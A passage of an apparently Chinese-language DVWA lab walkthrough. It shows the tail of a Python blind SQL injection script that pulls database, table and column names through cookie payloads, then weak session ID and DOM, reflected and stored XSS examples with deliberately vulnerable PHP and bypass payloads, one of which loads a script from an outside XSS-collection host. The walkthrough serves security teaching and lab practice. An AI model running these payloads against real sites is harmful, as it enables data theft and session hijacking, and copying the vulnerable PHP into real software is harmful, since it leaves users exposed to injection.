DBlen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            DBnamePayload = <span class="string">&quot;1&#x27; and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; #&quot;</span>.format(i,str(c))</span><br><span class="line">            cookies[<span class="string">&#x27;id&#x27;</span>] = DBnamePayload</span><br><span class="line">            response = s.get(url,cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                DBname += c</span><br><span class="line">                print(DBname)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&quot;DBname is:&quot;</span>, DBname)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出所有的表名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tableName</span>():</span></span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            tableName_payload = <span class="string">&quot;1&#x27; and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; #&quot;</span>.format(str(i),str(c))</span><br><span class="line">            cookies[<span class="string">&#x27;id&#x27;</span>] = tableName_payload</span><br><span class="line">            response = s.get(url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                table_name += c</span><br><span class="line">                print(<span class="string">&#x27;table_name:&#x27;</span>,table_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出指定表的所有列名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ColumnName</span>(<span class="params">tablename</span>):</span></span><br><span class="line">    column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            columnName_payload = <span class="string">&quot;1&#x27; and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;&#123;&#125;&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; #&quot;</span>.format(tablename,str(i),str(c))</span><br><span class="line">            cookies[<span class="string">&#x27;id&#x27;</span>] = columnName_payload</span><br><span class="line">            response = s.get(url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                column_name += c</span><br><span class="line">                print(<span class="string">&quot;column_name of TABLE &#123;&#125;:&#123;&#125;&quot;</span>.format(tablename,column_name))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>(<span class="params">columname, tablename</span>):</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            payload = <span class="string">&quot;1&#x27; and substr((select &#123;&#125; from &#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;#&quot;</span>.format(columname,tablename,i,str(c))</span><br><span class="line">            cookies[<span class="string">&#x27;id&#x27;</span>]=payload</span><br><span class="line">            response = s.get(url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                flag += c</span><br><span class="line">                print(<span class="string">&quot;flag is&quot;</span>,flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># dbnameLength()</span></span><br><span class="line">    <span class="comment"># dbname()</span></span><br><span class="line">    <span class="comment"># tableName()</span></span><br><span class="line">    <span class="comment"># table_name: f14g15here,guestbook,users</span></span><br><span class="line">    <span class="comment"># ColumnName(&#x27;f14g15here&#x27;)</span></span><br><span class="line">    <span class="comment"># column_name of TABLE f14g15here:f1ag</span></span><br><span class="line">    flag(<span class="string">&#x27;f1ag&#x27;</span>,<span class="string">&#x27;f14g15here&#x27;</span>)</span><br><span class="line">    <span class="comment"># flag is flag&#123;this_is_a_test_flag&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Impossible-6"><a href="#Impossible-6" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get results</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">            header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，Anti-CSRF token机制的加入了进一步提高了安全性。</p><h1 id="Weak-Session-IDS"><a href="#Weak-Session-IDS" class="headerlink" title="Weak Session IDS"></a>Weak Session IDS</h1><h2 id="Low-8"><a href="#Low-8" class="headerlink" title="Low"></a>Low</h2><p>顾名思义，因为<code>Session</code>的加密算法太弱或者其他情况导致<code>sessionID</code>可以预测和伪造。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">&#x27;last_session_id&#x27;</span>])) &#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;last_session_id&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;last_session_id&#x27;</span>]++;</span><br><span class="line">    $cookie_value = $_SESSION[<span class="string">&#x27;last_session_id&#x27;</span>];</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, $cookie_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>每点一次，<code>dvwaSession+1</code>，非常脆弱。</p><h2 id="Medium-8"><a href="#Medium-8" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    $cookie_value = time();</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, $cookie_value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>dvwaSession</code>用时间作为<code>sessionid</code>，但是依然比较容易伪造。当我需要伪造这个session的时候，可以通过一个<code>time()</code>函数完成。</p><h2 id="High-7"><a href="#High-7" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> ($_SESSION[<span class="string">&#x27;last_session_id_high&#x27;</span>])) &#123;</span><br><span class="line">        $_SESSION[<span class="string">&#x27;last_session_id_high&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;last_session_id_high&#x27;</span>]++;</span><br><span class="line">    $cookie_value = md5($_SESSION[<span class="string">&#x27;last_session_id_high&#x27;</span>]);</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, $_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>加了<code>md5函数</code>，但是<code>md5(value)</code>md5的参数<code>$_SESSION[&#39;last_session_id_high&#39;]</code>导致md5的加密性不强，容易查到：</p><p><img src="https://i.loli.net/2020/03/03/JDihEq6t3ceGPfX.png"></p><h2 id="Impossible-7"><a href="#Impossible-7" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$html = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    $cookie_value = sha1(mt_rand() . time() . <span class="string">&quot;Impossible&quot;</span>);</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, $cookie_value, time()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, $_SERVER[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码，通过加入随机数和事件来生成cookie，无意是难以猜解，非常安全的。</p><h1 id="XSS-DOM"><a href="#XSS-DOM" class="headerlink" title="XSS(DOM)"></a>XSS(DOM)</h1><blockquote><p>XSS，全称<code>Cross Site Scripting</code>，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于<code>JavaScript</code>，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。</p></blockquote><p>DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。DOM型XSS可能是存储型，也有可能是反射型，是基于DOM文档对象模型的一种漏洞。</p><p>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。以下属性都可能触发DOM型XSS：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">document.referer</span><br><span class="line">window.name</span><br><span class="line">location</span><br><span class="line">innerHTML</span><br><span class="line">documen.write</span><br></pre></td></tr></table></figure><h2 id="Low-9"><a href="#Low-9" class="headerlink" title="Low"></a>Low</h2><p>找XSS的漏洞，其实主要是从前端的HTML和js入手。</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;English&#x27;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br><span class="line">document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;French&#x27;</span>&gt;</span>French<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br><span class="line">document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;Spanish&#x27;</span>&gt;</span>Spanish<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br><span class="line">document.write(&quot;<span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&#x27;German&#x27;</span>&gt;</span>German<span class="tag">&lt;/<span class="name">option</span>&gt;</span>&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?default&#x3D;English&lt;script&gt;alert(&#39;xss&#39;);&lt;&#x2F;script&gt;</span><br><span class="line">用XSS平台接收一下：</span><br><span class="line">?default&#x3D;English&lt;sCRiPt&#x2F;SrC&#x3D;&#x2F;&#x2F;xss.pt&#x2F;****&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/03/xZSahG1mjlYUF5R.png"></p><h2 id="Medium-9"><a href="#Medium-9" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    $default = $_GET[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos ($default, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>stripos()</code>函数过滤含有<code>&lt;script&gt;</code>的标签数据(不区分大小写)。但是还有很多标签如<code>&lt;vsg&gt;</code>，<code>&lt;img&gt;</code>等等绕过。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?default&#x3D;English&lt;&#x2F;option&gt;&lt;&#x2F;select&gt;&lt;img src&#x3D;1 onerror&#x3D;alert(&#39;xss&#39;)&gt;</span><br></pre></td></tr></table></figure><p>但是需要注意闭合前面的标签。</p><h2 id="High-8"><a href="#High-8" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, $_GET ) &amp;&amp; !is_null ($_GET[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> ($_GET[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>白名单 只允许 传的 default值 为 French English German Spanish 其中一个</strong></p><p>用<code>#</code>可以传入数据，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?default&#x3D;English#&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h2 id="Impossible-8"><a href="#Impossible-8" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t need to do anything, protction handled on the client side</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>服务端不做任何事情，都在前端完成，从而没有输入点，避免了XSS。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> lang = <span class="built_in">document</span>.location.href.substring(<span class="built_in">document</span>.location.href.indexOf(<span class="string">&quot;default=&quot;</span>)+<span class="number">8</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&quot;</span> + lang + <span class="string">&quot;&#x27;&gt;&quot;</span> + (lang) + <span class="string">&quot;&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;&#x27; disabled=&#x27;disabled&#x27;&gt;----&lt;/option&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;English&#x27;&gt;English&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;French&#x27;&gt;French&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;Spanish&#x27;&gt;Spanish&lt;/option&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;option value=&#x27;German&#x27;&gt;German&lt;/option&gt;&quot;</span>);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/select&gt;</span><br></pre></td></tr></table></figure><h1 id="XSS-Reflected"><a href="#XSS-Reflected" class="headerlink" title="XSS(Reflected)"></a>XSS(Reflected)</h1><h2 id="Low-10"><a href="#Low-10" class="headerlink" title="Low"></a>Low</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . $_GET[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>直接将<code>$_GET[name]</code>拼接到了HTML标签中，于是容易XSS</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;&lt;script&gt;alert(1);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>但是反射型XSS，一般无法弹cookie，在配合CSRF时，还有很多的操作空间。</p><h2 id="Medium-10"><a href="#Medium-10" class="headerlink" title="Medium"></a>Medium</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过<code>str_replace</code>过滤了<code>&lt;script&gt;</code>,但是可以直接通过大小写绕过，双写绕过或使用其他标签。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;scRipt&gt;alert(&#39;XSS&#39;);&lt;&#x2F;Script&gt;</span><br></pre></td></tr></table></figure><h2 id="High-9"><a href="#High-9" class="headerlink" title="High"></a>High</h2><p>服务器端核心代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">// Is there any input? </span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    $name = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[ <span class="string">&#x27;name&#x27;</span> ] ); </span><br><span class="line">    <span class="comment">// Feedback for end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，High级别的代码同样使用黑名单过滤输入，preg_replace()函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。</p><p><strong>漏洞利用</strong></p><p>虽然无法使用<code>&lt;script&gt;</code>标签注入XSS代码，但是可以通过<code>img、body</code>等标签的事件或者iframe等标签的src注入恶意的js代码。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;</span><br></pre></td></tr></table></figure><h2 id="Impossible-9"><a href="#Impossible-9" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $name = htmlspecialchars( $_GET[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码使用<code>htmlspecialchars</code>函数把预定义的字符<code>&amp;、”、 ’、&lt;、&gt;</code>转换为HTML实体，防止浏览器将其作为HTML元素。</p><h1 id="XSS-Stored"><a href="#XSS-Stored" class="headerlink" title="XSS(Stored)"></a>XSS(Stored)</h1><h2 id="Low-11"><a href="#Low-11" class="headerlink" title="Low"></a>Low</h2><p>明显的存储型XSS。<code>trim</code>去除数据末尾的空白符，<code>stripslashes(string)</code>函数删除字符串中的反斜杠。然后用SQL语句拼接到数据库里存储起来，并且再次访问时，会调用这些数据，写到一个一个div中</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;guestbook_comments&quot;&gt;Name: test&lt;br &#x2F;&gt;Message: This is a test comment.&lt;br &#x2F;&gt;&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><p>源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;btnSign&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $message = trim( $_POST[ <span class="string">&#x27;mtxMessage&#x27;</span> ] );</span><br><span class="line">    $name    = trim( $_POST[ <span class="string">&#x27;txtName&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize message input</span></span><br><span class="line">    $message = stripslashes( $message );</span><br><span class="line">    $message = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $message ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitize name input</span></span><br><span class="line">    $name = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $name ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Update database</span></span><br><span class="line">    $query  = <span class="string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;$message&#x27;, &#x27;$name&#x27; );&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? 